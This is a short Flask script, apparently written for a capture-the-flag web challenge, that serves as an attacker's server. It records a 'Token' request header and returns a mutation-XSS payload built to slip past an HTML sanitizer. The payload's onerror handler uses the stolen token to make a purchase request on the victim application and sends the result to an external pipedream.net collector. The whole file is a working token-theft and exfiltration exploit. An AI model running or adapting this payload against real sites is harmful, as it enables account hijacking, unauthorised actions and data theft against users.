from flask import * 

app = Flask(__name__)

token = ""

@app.route('/', methods=["get","options","post"])
def index():
    global token
    print(dict(request.headers))
    if request.method == "GET":
        print('token:',dict(request.headers)["Token"])
        token = dict(request.headers)["Token"]
    resp = Response('{"detail":"<form><math><mtext></form><form><mglyph><style></math><img src onerror=\\"fetch(\'/4/buy\',{method:\'post\',headers:{\'Token\':\''+token+'\'}}).then(res=>res.text()).then(text=>fetch(\'https://eodxumeonkl064t.m.pipedream.net\',{method:\'post\',body:text}))\\">"}')
    resp.headers['Access-Control-Allow-Origin'] = 'http://localhost:3000'
    resp.headers['Access-Control-Allow-Headers'] = "token"
    return resp

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)